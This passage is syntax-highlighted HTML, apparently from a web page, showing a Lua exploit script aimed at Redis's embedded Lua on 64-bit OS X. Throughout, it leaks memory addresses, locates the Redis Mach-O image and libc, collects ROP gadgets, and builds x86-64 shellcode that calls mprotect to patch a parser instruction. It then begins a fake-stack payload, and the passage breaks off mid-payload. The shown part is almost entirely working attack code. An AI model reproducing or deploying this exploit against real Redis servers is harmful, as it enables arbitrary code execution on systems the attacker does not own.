</span><span class='line'>        <span class="kd">local</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">addint</span><span class="p">(</span><span class="n">stream</span><span class="p">.</span><span class="n">start_offset</span><span class="p">,</span> <span class="n">found_rops</span><span class="p">[</span><span class="n">rop</span><span class="p">])</span>
</span><span class='line'>        <span class="kd">local</span> <span class="n">name</span> <span class="o">=</span> <span class="n">named_rops</span><span class="p">[</span><span class="n">rop</span><span class="p">].</span><span class="n">name</span>
</span><span class='line'>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[*] Found rop: &quot;</span> <span class="o">..</span> <span class="n">name</span> <span class="o">..</span> <span class="s2">&quot;</span><span class="s"> @ &quot;</span> <span class="o">..</span> <span class="n">dump8</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span>
</span><span class='line'>        <span class="n">inverted</span><span class="p">[</span><span class="n">name</span><span class="p">]</span> <span class="o">=</span> <span class="n">addr</span>
</span><span class='line'>      <span class="k">end</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">inverted</span>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">copy_words</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">from</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">buf</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span><span class="n">n</span> <span class="k">do</span>
</span><span class='line'>    <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">read_word</span><span class="p">(</span><span class="n">from</span><span class="p">)</span>
</span><span class='line'>    <span class="n">from</span> <span class="o">=</span> <span class="n">addbyte</span><span class="p">(</span><span class="n">from</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">buf</span> <span class="o">=</span> <span class="nb">table.concat</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="s2">&quot;</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">buf</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">check_system</span> <span class="o">=</span> <span class="n">function</span><span class="p">()</span>
</span><span class='line'><span class="c1">-- os:Darwin 14.3.0 x86_64</span>
</span><span class='line'><span class="c1">-- arch_bits:64</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">info</span> <span class="o">=</span> <span class="n">redis</span><span class="p">.</span><span class="n">call</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">INFO&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">os</span> <span class="o">=</span> <span class="nb">string.match</span><span class="p">(</span><span class="n">info</span><span class="p">,</span> <span class="s2">&quot;</span><span class="s">os:([^</span><span class="se">\r\n</span><span class="s">]*)&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="nb">string.find</span><span class="p">(</span><span class="n">os</span><span class="p">,</span> <span class="s2">&quot;</span><span class="s">Darwin&quot;</span><span class="p">)</span> <span class="k">then</span>
</span><span class='line'>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[*] Matches OSX =&gt; &quot;</span> <span class="o">..</span> <span class="n">os</span><span class="p">)</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>    <span class="n">fail</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">Not OSX =&gt; &quot;</span> <span class="o">..</span> <span class="n">os</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">arch_bits</span> <span class="o">=</span> <span class="nb">string.match</span><span class="p">(</span><span class="n">info</span><span class="p">,</span> <span class="s2">&quot;</span><span class="s">arch_bits:([^</span><span class="se">\r\n</span><span class="s">]*)&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="n">arch_bits</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="s">64&quot;</span> <span class="k">then</span>
</span><span class='line'>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[*] 64 Bit&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>    <span class="n">fail</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">Not 64 Bit =&gt; &quot;</span> <span class="o">..</span> <span class="n">arch_bits</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">check_bytecode</span> <span class="o">=</span> <span class="n">function</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">f</span> <span class="o">=</span> <span class="nb">loadstring</span><span class="p">(</span><span class="nb">string.dump</span><span class="p">(</span><span class="n">function</span><span class="p">()</span> <span class="k">end</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="n">f</span> <span class="o">==</span> <span class="kc">nil</span> <span class="k">then</span>
</span><span class='line'>    <span class="n">fail</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">Loading byte code not supported&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[*] Loading byte code supported&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">find_fparser_cmp</span> <span class="o">=</span> <span class="n">function</span><span class="p">(</span><span class="n">program_information</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">redis_text_segment</span> <span class="o">=</span> <span class="n">program_information</span><span class="p">.</span><span class="n">redis_segments</span><span class="p">[</span><span class="s2">&quot;</span><span class="s">__TEXT&quot;</span><span class="p">]</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">stream</span> <span class="o">=</span> <span class="n">new_lazy_stream</span><span class="p">(</span><span class="n">program_information</span><span class="p">.</span><span class="n">redis</span><span class="p">,</span> <span class="n">toint</span><span class="p">(</span><span class="n">redis_text_segment</span><span class="p">.</span><span class="n">vm_size</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">re</span> <span class="o">=</span> <span class="n">join</span><span class="p">(</span><span class="n">dotstar</span><span class="p">(),</span> <span class="n">literal</span><span class="p">(</span><span class="nb">string.char</span><span class="p">(</span><span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">)))</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">state</span> <span class="o">=</span> <span class="n">re_start</span><span class="p">(</span><span class="n">re</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">found</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">visited</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">lazy_stream_empty</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span> <span class="k">do</span>
</span><span class='line'>    <span class="kd">local</span> <span class="n">next_byte</span> <span class="o">=</span> <span class="n">lazy_stream_read</span><span class="p">(</span><span class="n">stream</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="n">next_byte</span> <span class="o">==</span> <span class="kc">nil</span> <span class="k">then</span>
</span><span class='line'>      <span class="n">state</span> <span class="o">=</span> <span class="n">re_restart</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">re</span><span class="p">)</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>      <span class="n">state</span> <span class="o">=</span> <span class="n">re_push_byte</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">next_byte</span><span class="p">)</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">for</span> <span class="n">i</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span><span class="o">#</span><span class="p">(</span><span class="n">state</span><span class="p">.</span><span class="n">current_list</span><span class="p">)</span> <span class="k">do</span>
</span><span class='line'>      <span class="kd">local</span> <span class="n">s</span> <span class="o">=</span> <span class="n">state</span><span class="p">.</span><span class="n">current_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span><span class='line'>      <span class="k">if</span> <span class="n">s</span><span class="p">.</span><span class="n">byte</span> <span class="o">==</span> <span class="n">FINAL</span> <span class="k">then</span>
</span><span class='line'>
</span><span class='line'>        <span class="nb">table.insert</span><span class="p">(</span><span class="n">found</span><span class="p">,</span> <span class="n">stream</span><span class="p">.</span><span class="n">current_offset</span> <span class="o">-</span> <span class="nb">string.len</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">matched</span><span class="p">))</span>
</span><span class='line'>      <span class="k">end</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="o">#</span><span class="n">found</span> <span class="o">==</span> <span class="mi">1</span> <span class="k">then</span>
</span><span class='line'>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[*] found cmp   r15, 0x1b&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>    <span class="n">fail</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">could not find unique cmp r15,0x1b &quot;</span> <span class="o">..</span> <span class="o">#</span><span class="n">found</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">cmp_addr</span> <span class="o">=</span> <span class="n">addint</span><span class="p">(</span><span class="n">stream</span><span class="p">.</span><span class="n">start_offset</span><span class="p">,</span> <span class="n">found</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
</span><span class='line'>
</span><span class='line'>  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[*] found cmp @ &quot;</span> <span class="o">..</span> <span class="n">dump8</span><span class="p">(</span><span class="n">cmp_addr</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">cmp_addr</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">check_system</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="n">check_bytecode</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">co</span> <span class="o">=</span> <span class="nb">coroutine.wrap</span><span class="p">(</span><span class="n">function</span><span class="p">()</span> <span class="k">end</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">read_word</span><span class="p">(</span><span class="n">addbyte</span><span class="p">(</span><span class="n">asstring</span><span class="p">(</span><span class="n">co</span><span class="p">),</span> <span class="mi">32</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">macho_address</span> <span class="o">=</span> <span class="n">findmacho</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="s">[*] found macho base address: &#39;</span> <span class="o">..</span> <span class="n">dump8</span><span class="p">(</span><span class="n">macho_address</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">program_information</span> <span class="o">=</span> <span class="n">parse_redis_macho</span><span class="p">(</span><span class="n">macho_address</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">mprotect_addr</span>  <span class="o">=</span> <span class="n">parse_libkernel_macho</span><span class="p">(</span><span class="n">program_information</span><span class="p">.</span><span class="n">libkernel</span><span class="p">)</span>
</span><span class='line'><span class="kd">local</span> <span class="n">libc_segments</span> <span class="o">=</span> <span class="n">parse_libsystem_c_macho</span><span class="p">(</span><span class="n">program_information</span><span class="p">.</span><span class="n">libsystem_c</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">longjmp_addr</span> <span class="o">=</span> <span class="n">program_information</span><span class="p">.</span><span class="n">longjmp_address</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">named_rops</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'><span class="n">named_rops</span><span class="p">[</span><span class="nb">string.char</span><span class="p">(</span><span class="mh">0x5E</span><span class="p">,</span><span class="mh">0x5D</span><span class="p">,</span><span class="mh">0xC3</span><span class="p">)]</span> <span class="o">=</span> <span class="p">{</span><span class="n">name</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="s">poprsipoprbp&quot;</span><span class="p">,</span> <span class="n">offsets</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x1b83</span><span class="p">,</span> <span class="mh">0x144b</span><span class="p">}}</span>
</span><span class='line'><span class="n">named_rops</span><span class="p">[</span><span class="nb">string.char</span><span class="p">(</span><span class="mh">0x5F</span><span class="p">,</span><span class="mh">0x5D</span><span class="p">,</span><span class="mh">0xC3</span><span class="p">)]</span> <span class="o">=</span> <span class="p">{</span><span class="n">name</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="s">poprdipoprbp&quot;</span><span class="p">,</span> <span class="n">offsets</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x1d08</span><span class="p">,</span> <span class="mh">0x15ee</span><span class="p">}}</span>
</span><span class='line'><span class="n">named_rops</span><span class="p">[</span><span class="nb">string.char</span><span class="p">(</span><span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x5E</span><span class="p">,</span> <span class="mh">0x5D</span><span class="p">,</span> <span class="mh">0xC3</span><span class="p">)]</span> <span class="o">=</span> <span class="p">{</span><span class="n">name</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="s">poprbxpopr14poprbp&quot;</span><span class="p">,</span> <span class="n">offsets</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x1b81</span><span class="p">,</span><span class="mh">0x1449</span><span class="p">}}</span>
</span><span class='line'><span class="n">named_rops</span><span class="p">[</span><span class="nb">string.char</span><span class="p">(</span><span class="mh">0x4C</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xF2</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0xD3</span><span class="p">)]</span> <span class="o">=</span> <span class="p">{</span><span class="n">name</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="s">movrdxr14callrbx&quot;</span><span class="p">,</span> <span class="n">offsets</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x642f4</span><span class="p">,</span><span class="mh">0x604f0</span><span class="p">}}</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">target_instruction</span> <span class="o">=</span> <span class="n">find_fparser_cmp</span><span class="p">(</span><span class="n">program_information</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">libc_text_segment</span> <span class="o">=</span> <span class="n">libc_segments</span><span class="p">[</span><span class="s2">&quot;</span><span class="s">__TEXT&quot;</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="c1">-- we assume vm_addr == 0</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">libc_text_stream</span> <span class="o">=</span> <span class="n">new_lazy_stream</span><span class="p">(</span><span class="n">program_information</span><span class="p">.</span><span class="n">libsystem_c</span><span class="p">,</span> <span class="n">toint</span><span class="p">(</span><span class="n">libc_text_segment</span><span class="p">.</span><span class="n">vm_size</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">rop_addresses</span> <span class="o">=</span> <span class="n">find_rops_and_assert</span><span class="p">(</span><span class="n">named_rops</span><span class="p">,</span> <span class="n">libc_text_stream</span><span class="p">,</span> <span class="n">program_information</span><span class="p">.</span><span class="n">libsystem_c</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">poprbp</span> <span class="o">=</span> <span class="n">addint</span><span class="p">(</span><span class="n">rop_addresses</span><span class="p">.</span><span class="n">poprsipoprbp</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">dummy</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\1\1\1\1\1\1\1\1</span><span class="s">&#39;</span>
</span><span class='line'><span class="kd">local</span> <span class="n">null</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\0\0\0\0\0\0\0\0</span><span class="s">&#39;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">shellcode</span> <span class="o">=</span> <span class="kc">nil</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">payload_str</span> <span class="o">=</span> <span class="kc">nil</span>
</span><span class='line'>
</span><span class='line'><span class="kd">local</span> <span class="n">old_jump_buf</span> <span class="o">=</span> <span class="kc">nil</span>
</span><span class='line'>
</span><span class='line'><span class="nb">collectgarbage</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="n">co</span> <span class="o">=</span> <span class="nb">coroutine.create</span><span class="p">(</span><span class="k">function</span> <span class="p">()</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">stack_pointer</span> <span class="o">=</span> <span class="n">read_word</span><span class="p">(</span><span class="n">addbyte</span><span class="p">(</span><span class="n">asstring</span><span class="p">(</span><span class="n">co</span><span class="p">),</span> <span class="mi">8</span> <span class="o">*</span> <span class="mi">21</span><span class="p">))</span>
</span><span class='line'>  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[*] leaked stack pointer: &quot;</span> <span class="o">..</span> <span class="n">dump8</span><span class="p">(</span><span class="n">stack_pointer</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">jmp_buf_eip</span> <span class="o">=</span> <span class="n">addint</span><span class="p">(</span><span class="n">stack_pointer</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">jmp_buf_sp</span> <span class="o">=</span> <span class="n">addint</span><span class="p">(</span><span class="n">stack_pointer</span><span class="p">,</span> <span class="mi">24</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">existing_eip</span> <span class="o">=</span> <span class="n">read_word</span><span class="p">(</span><span class="n">jmp_buf_eip</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[*] old jump_buf eip &quot;</span> <span class="o">..</span> <span class="n">dump8</span><span class="p">(</span><span class="n">existing_eip</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">existing_sp</span> <span class="o">=</span> <span class="n">read_word</span><span class="p">(</span><span class="n">jmp_buf_sp</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[*] existing sp &quot;</span> <span class="o">..</span> <span class="n">dump8</span><span class="p">(</span><span class="n">existing_sp</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>  <span class="n">old_jump_buf</span> <span class="o">=</span> <span class="n">copy_words</span><span class="p">(</span><span class="n">stack_pointer</span><span class="p">,</span> <span class="mi">48</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">old_jump_buf_addr</span> <span class="o">=</span> <span class="n">addint</span><span class="p">(</span><span class="n">cstring</span><span class="p">(</span><span class="n">old_jump_buf</span><span class="p">),</span> <span class="mi">8</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">shellcode</span> <span class="o">=</span>
</span><span class='line'>    <span class="c1">-- 48 bf VALUE    movabs    rdi,VALUE</span>
</span><span class='line'>    <span class="nb">string.char</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0xbf</span><span class="p">)</span> <span class="o">..</span> <span class="n">pagealign</span><span class="p">(</span><span class="n">target_instruction</span><span class="p">)</span> <span class="o">..</span>
</span><span class='line'>    <span class="c1">-- 48 c7 c6 00 20 00 00    mov    rsi,0x2000</span>
</span><span class='line'>    <span class="nb">string.char</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">)</span> <span class="o">..</span>
</span><span class='line'>    <span class="c1">-- 48 c7 c2 07 00 00 00    mov    rdx,0x7</span>
</span><span class='line'>    <span class="nb">string.char</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0xc2</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">)</span> <span class="o">..</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">-- 48 b8 VALUE movabs rax, VALUE</span>
</span><span class='line'>    <span class="nb">string.char</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">)</span> <span class="o">..</span> <span class="n">mprotect_addr</span> <span class="o">..</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">-- ff d0                   call   rax</span>
</span><span class='line'>
</span><span class='line'>    <span class="nb">string.char</span><span class="p">(</span><span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">)</span> <span class="o">..</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">-- 48 bf VALUE    movabs    rdi,VALUE</span>
</span><span class='line'>    <span class="nb">string.char</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0xbf</span><span class="p">)</span> <span class="o">..</span> <span class="n">target_instruction</span> <span class="o">..</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">-- c7 07 VALUE       mov    DWORD PTR [rdi],VALUE</span>
</span><span class='line'>
</span><span class='line'>    <span class="nb">string.char</span><span class="p">(</span><span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">)</span> <span class="o">..</span> <span class="nb">string.char</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">)</span> <span class="o">..</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">-- restore permissions</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">-- 48 bf VALUE    movabs    rdi,VALUE</span>
</span><span class='line'>    <span class="nb">string.char</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span><span class="mh">0xbf</span><span class="p">)</span> <span class="o">..</span> <span class="n">pagealign</span><span class="p">(</span><span class="n">target_instruction</span><span class="p">)</span> <span class="o">..</span>
</span><span class='line'>    <span class="c1">-- 48 c7 c6 00 20 00 00    mov    rsi,0x2000</span>
</span><span class='line'>    <span class="nb">string.char</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">)</span> <span class="o">..</span>
</span><span class='line'>    <span class="c1">-- 48 c7 c2 05 00 00 00    mov    rdx,0x5</span>
</span><span class='line'>    <span class="nb">string.char</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0xc2</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">)</span> <span class="o">..</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">-- ret</span>
</span><span class='line'>    <span class="nb">string.char</span><span class="p">(</span><span class="mh">0xc3</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">shellcode_ptr</span> <span class="o">=</span> <span class="n">cstring</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="s">[*] shellcode_ptr &quot;</span> <span class="o">..</span> <span class="n">dump8</span><span class="p">(</span><span class="n">shellcode_ptr</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">rdi</span> <span class="o">=</span> <span class="n">pagealign</span><span class="p">(</span><span class="n">shellcode_ptr</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">rsi</span> <span class="o">=</span> <span class="n">tob8</span><span class="p">(</span><span class="mi">8192</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">rdx_all</span> <span class="o">=</span> <span class="n">tob8</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span> <span class="c1">-- PROT_READ | PROT_WRITE | PROT_EXEC</span>
</span><span class='line'>  <span class="kd">local</span> <span class="n">rdx_read_write</span> <span class="o">=</span> <span class="n">tob8</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="c1">-- PROT_READ | PROT_WRITE</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">local</span> <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
</span><span class='line'>          <span class="cm">--[[ padding for our fake stack. `system` calls into the dynamic linker because of stubbed crap. so stack can get quite big. 1024 bytes =&gt; stack overflow and corruption of lua/redis heap ]]</span>
</span><span class='line'>          <span class="s2">&quot;</span><span class="s">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&quot;</span><span class="p">,</span>
</span><span class='line'>          <span class="s2">&quot;</span><span class="s">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&quot;</span><span class="p">,</span>
